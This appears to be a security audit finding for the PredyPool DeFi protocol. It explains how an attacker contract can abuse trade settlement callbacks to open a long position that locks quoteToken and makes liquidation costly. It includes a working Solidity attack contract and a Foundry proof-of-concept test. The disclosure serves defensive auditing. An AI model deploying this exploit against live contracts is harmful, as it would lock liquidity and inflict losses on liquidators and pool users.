# Vulnerability details

## Impact
Explaining an attack path for locking `quoteToken` by longing a position.

An attack contract will open a long position by calling `PredyPool::trade` with `tradeAmount = X (X > 0)`.

During `callSettlementCallback`, the attack contract will send `X baseToken` to `PredyPool` and take `Xp + Y quoteToken` from `PredyPool` (`p` is the price).

During `callTradeAfterCallback`, the attack contract will send `Y + M quoteToken` to `PredyPool` (`M` is the margin).

At the end, we created a long position of `X baseToken`, `-(Xp + Y) quoteToken` and `Y + M quoteToken` margin. When `M` is larger than `1e6` (`Constants.MIN_MARGIN_AMOUNT`), this position will pass the `PositionCalculator::checkSafe` function.

To maximize the impact, `X` should be as little as possible, `Y` should be the same amount of `quoteToken` in the pair.

Impact:
1. Lock `Y quoteToken` at the cost of `X baseToken` and `M - Xp quoteToken`.
2. After a block, this position will be liquidatable because of the large interest on `-(Xp + Y) quoteToken`, but any liquidator liquidate this position must compensate for that large interest. And the interest will grow bigger each block.

pragma solidity ^0.8.0;

import {console} from "forge-std/Test.sol";

import {TestPerpMarket} from "./market/perp/Setup.t.sol";
import {PerpMarketLib} from "../src/markets/perp/PerpMarketLib.sol";
import {MockPriceFeed} from "./mocks/MockPriceFeed.sol";
import {Constants} from "../src/libraries/Constants.sol";
import {IPredyPool} from "../src/interfaces/IPredyPool.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Attack {
    IPredyPool predyPool;
    address currency0;
    address currency1;

    constructor(address _predyPool, address _currency0, address _currency1) {
        predyPool = IPredyPool(_predyPool);
        currency0 = _currency0;
        currency1 = _currency1;
    }

    function predySettlementCallback(
        address quoteToken,
        address baseToken,
        bytes memory settlementData,
        int256 baseAmountDelta
    ) external {
        IERC20(currency0).transfer(address(predyPool), 1e6);
        predyPool.take(true, address(this), 1e6 + 900e18);
    }

    function predyTradeAfterCallback(
        IPredyPool.TradeParams memory tradeParams,
        IPredyPool.TradeResult memory tradeResult
    ) external {
        IERC20(currency1).transfer(address(predyPool), 2e6 + 900e18);
    }

    function run() public {
        predyPool.trade(IPredyPool.TradeParams(
            1,
            0,
            1e6,
            0,
            "0x"
        ), "0x");
    }
}

contract POC is TestPerpMarket {
    Attack attack;
    MockPriceFeed private _priceFeed;

    function setUp() public override {
        TestPerpMarket.setUp();

        _priceFeed = new MockPriceFeed();

        _priceFeed.setSqrtPrice(Constants.Q96);

        registerPair(address(currency1), address(_priceFeed));
        perpMarket.updateQuoteTokenMap(1);

        predyPool.supply(1, true, 1000e18);
        predyPool.supply(1, false, 1000e18);

        currency1.mint(address(perpMarket), 1e30);
        vm.prank(address(perpMarket));
        currency1.approve(address(predyPool), 1e30);

        attack = new Attack(address(predyPool), address(currency0), address(currency1));
        currency0.mint(address(attack), 1e6);
        currency1.mint(address(attack), 2e6);
    }

    function test() public {
        attack.run();
        vm.warp(block.timestamp + 1 seconds);

        uint256 marketBalanceBefore = currency1.balanceOf(address(perpMarket));
        perpMarket.execLiquidationCall(1, 1e18, _getUniSettlementDataV3(0));
        uint256 marketBalanceAfter = currency1.balanceOf(address(perpMarket));

        console.log("Liquidation Fee: ", marketBalanceBefore - marketBalanceAfter);
    }
}
